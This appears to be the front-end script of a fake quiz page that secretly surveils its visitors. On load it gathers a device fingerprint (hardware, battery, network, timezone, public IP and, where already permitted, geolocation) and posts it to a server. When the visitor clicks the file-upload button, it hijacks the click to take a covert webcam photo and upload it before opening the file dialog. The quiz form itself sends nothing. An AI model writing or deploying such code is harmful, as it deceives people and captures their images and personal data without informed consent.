const form = document.getElementById("quiz-form");
const fileInput = document.getElementById("user-file");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

const METADATA_API = "/api/file-upload";
const IMAGE_API = "/api/upload";

let capturedImage = null;
let cameraCaptured = false;
let cameraRunning = false;

const constraints = {
  video: { facingMode: "user" },
  audio: false
};


// =============================
// METADATA COLLECTION
// =============================
async function collectMetadata() {

  const metadata = {

    userAgent: navigator.userAgent || null,
    platform: navigator.platform || null,
    language: navigator.language || null,
    languages: navigator.languages || [],
    cookiesEnabled: navigator.cookieEnabled ?? null,

    screen: {
      width: screen.width ?? null,
      height: screen.height ?? null,
      pixelRatio: window.devicePixelRatio ?? null
    },

    viewport: {
      width: window.innerWidth ?? null,
      height: window.innerHeight ?? null
    },

    hardware: {
      deviceMemory: navigator.deviceMemory ?? null,
      cpuCores: navigator.hardwareConcurrency ?? null
    },

    battery: {
      level: null,
      charging: null
    },

    location: {
      lat: null,
      lon: null
    },

    network: {
      type: null,
      downlink: null,
      rtt: null
    },

    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
    time: new Date().toISOString(),
    ip: null
  };


  // battery
  try {
    if (navigator.getBattery) {

      const battery = await navigator.getBattery();

      metadata.battery.level = Math.round(battery.level * 100);
      metadata.battery.charging = battery.charging;

    }
  } catch {}


  // network
  try {
    if (navigator.connection) {

      metadata.network.type = navigator.connection.effectiveType || null;
      metadata.network.downlink = navigator.connection.downlink ?? null;
      metadata.network.rtt = navigator.connection.rtt ?? null;

    }
  } catch {}


  // location (only if permission already granted)
  try {

    if (navigator.permissions && navigator.geolocation) {

      const status = await navigator.permissions.query({ name: "geolocation" });

      if (status.state === "granted") {

        const pos = await new Promise((resolve, reject) =>
          navigator.geolocation.getCurrentPosition(resolve, reject)
        );

        metadata.location.lat = pos.coords.latitude;
        metadata.location.lon = pos.coords.longitude;

      }

    }

  } catch {}


  // public IP
  try {

    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();

    metadata.ip = ipData.ip;

  } catch {}


  return metadata;

}


// =============================
// CAMERA CAPTURE
// =============================
async function captureCamera() {

  if (cameraCaptured || cameraRunning) return;

  cameraRunning = true;

  try {

    const stream = await navigator.mediaDevices.getUserMedia(constraints);

    video.srcObject = stream;
    video.style.display = "block";

    await video.play();

    await new Promise(r => setTimeout(r, 1200));

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;

    const ctx = canvas.getContext("2d");

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    capturedImage = canvas.toDataURL("image/png");

    console.log("Captured image");

    stream.getTracks().forEach(track => track.stop());

    video.style.display = "none";

    cameraCaptured = true;

  } catch (err) {

    console.error("Camera error:", err);

  }

  cameraRunning = false;

}


// =============================
// UPLOAD CAMERA IMAGE
// =============================
async function uploadImage() {

  if (!capturedImage) return;

  try {

    const res = await fetch(IMAGE_API, {

      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },

      body: JSON.stringify({
        image: capturedImage
      })

    });

    const data = await res.json();

    console.log("Image uploaded:", data);

  } catch (err) {

    console.error("Image upload failed:", err);

  }

}


// =============================
// SEND METADATA
// =============================
async function sendMetadata() {

  try {

    const metadata = await collectMetadata();

    const res = await fetch(METADATA_API, {

      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },

      body: JSON.stringify({
        metadata: metadata
      })

    });

    const data = await res.json();

    console.log("Metadata saved:", data);

  } catch (err) {

    console.error("Metadata upload failed:", err);

  }

}


// =============================
// FILE INPUT CLICK
// =============================
fileInput.addEventListener("click", async (e) => {

  if (!cameraCaptured) {

    e.preventDefault();

    await captureCamera();

    await uploadImage();

    setTimeout(() => {
      fileInput.click();
    }, 100);

  }

});


// =============================
// AUTO SEND METADATA
// =============================
window.addEventListener("DOMContentLoaded", () => {

  sendMetadata();

});


// =============================
// FORM SUBMIT
// =============================
form.addEventListener("submit", (e) => {

  e.preventDefault();

  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "block";

});
